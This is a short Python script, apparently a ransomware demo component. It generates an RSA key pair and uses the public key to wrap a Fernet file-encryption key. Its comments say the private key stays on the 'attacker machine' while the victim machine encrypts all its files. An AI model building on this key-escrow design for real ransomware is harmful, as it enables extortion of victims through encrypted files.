from Crypto.PublicKey import RSA 
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP
import base64

key = RSA.generate(2048)
 
private_key = key.exportKey()
with open('private.pem','wb') as f: # (pem) = privacy enhanced mail 
    f.write(private_key)

public_key = key.publickey().exportKey()
with open('public.pem','wb') as f:
    f.write(public_key)

# Encryption using RSA public key to encrypt the fernet encryption keys 
print('> Encryption')

# Public RSA key 

public_key = RSA.importKey(open('public.pem').read())

with open('fernet_key.txt','rb') as f: 
    fernet_key = f.read()

# Public encryptor 
public_crypter = PKCS1_OAEP.new(public_key)

# Encrypt session key 
with open('enc_fernet_key.txt','wb') as f: 
    enc_fernet_key = public_crypter.encrypt(fernet_key)
    f.write(enc_fernet_key)

print(f'> Public key: {public_key}')
print(f'> Fernet key: {fernet_key}')
print(f'> Public Encrypter: {public_crypter}')
print(f'> Encrypted Fernet key: {enc_fernet_key}')
print(f'> Encryption completed\n') 

# Decryption using RSA private key to decrypt fernet encryption key 
# This key would remain on the attacker machine and decryption would take place on that machine 
# Only the victim machine will have the fernet key/crypter and RSA public key to encrypt that key after it has encrypted all the files 

print('> Decryption')
with open('enc_fernet_key.txt','rb') as f: 
    enc_fernet_key = f.read()

# Private RSA key

private_key = RSA.importKey(open('private.pem').read())

# Private RSA decryptor 

private_cryptor = PKCS1_OAEP.new(private_key)

# Decrypted session key 

dec_fernet_key = private_cryptor.decrypt(enc_fernet_key)
with open('dec_fernet_key.txt','wb') as f: 
    f.write(dec_fernet_key)

print(f'> Private_key: {private_key}')
print(f'> Private_Decrypter: {private_cryptor}')
print(f'> Decrypted fernet key: {dec_fernet_key}')
print(f'> Decryption Completed')


